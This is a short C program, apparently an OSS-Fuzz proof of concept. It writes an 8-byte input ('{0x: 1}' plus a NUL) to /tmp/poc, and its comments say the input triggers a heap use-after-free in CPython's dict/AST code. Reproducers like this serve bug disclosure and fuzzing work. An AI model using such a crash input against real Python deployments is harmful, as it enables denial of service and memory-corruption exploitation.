#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:368076875 */
/* Triggers: heap-use-after-free in _Py_IsImmortal (CPython dict/AST) */
/* Vuln class: use_after_free */

int main(void) {
    /* Write the exact 8-byte payload: "{0x: 1}" followed by a NUL terminator */
    /* The harness rejects inputs without an embedded NUL byte */
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fwrite("{0x: 1}", 1, 7, f);
    fputc(0x00, f);
    fclose(f);
    return 0;
}